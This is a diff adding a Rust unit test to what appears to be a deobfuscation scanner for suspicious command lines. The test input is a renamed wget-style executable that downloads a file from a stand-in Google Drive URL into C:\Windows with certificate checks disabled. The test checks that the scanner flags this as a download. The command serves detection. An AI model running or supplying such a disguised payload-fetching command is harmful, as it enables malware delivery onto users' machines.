@@ -33994,6 +33994,27 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
             env.traits
         );
     }
+
+    #[test]
+    fn renamed_wget_style_command_with_wget_flags_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Windows\w\w.exe -c -O "C:\Windows\nl.exe" "C:\Windows" "https://drive.google.example/u/0/uc?id=stage&export=download" --no-check-certificate"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://drive.google.example/u/0/uc?id=stage&export=download"
+                        && dst.as_deref() == Some(r#"C:\Windows\nl.exe"#)
+            )
+        });
+        assert!(
+            has,
+            "renamed wget-style command did not emit structured Download: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
